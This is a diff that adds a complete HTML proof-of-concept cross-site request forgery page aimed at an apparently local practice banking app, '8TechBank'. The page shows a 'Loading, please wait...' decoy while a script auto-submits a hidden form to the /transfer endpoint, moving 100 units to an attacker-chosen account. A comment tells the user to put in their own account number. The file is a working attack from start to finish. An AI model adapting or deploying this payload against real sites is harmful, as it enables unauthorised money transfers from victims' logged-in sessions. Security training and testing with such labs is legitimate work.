@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - 8TechBank</title>
+</head>
+<body>
+    <h2>Loading, please wait...</h2>
+    <form action="http://127.0.0.1:5000/transfer" method="POST" id="csrfForm">
+        <!-- Recipient account (change to YOUR account number) -->
+        <input type="hidden" name="recipient_account" value="8TB-712515">
+        <input type="hidden" name="amount" value="100">
+        <input type="hidden" name="memo" value="CSRF Attack">
+        <input type="hidden" name="action" value="confirm">
+        <!-- The sender_id is read from session on the backend, but we can also provide it -->
+        <input type="hidden" name="sender_id" value="1">
+    </form>
+    <script>
+        // Submit the form immediately
+        document.getElementById('csrfForm').submit();
+    </script>
+    <p>If nothing happens, <button onclick="document.getElementById('csrfForm').submit();">click here</button> to submit manually.</p>
+</body>
+</html>
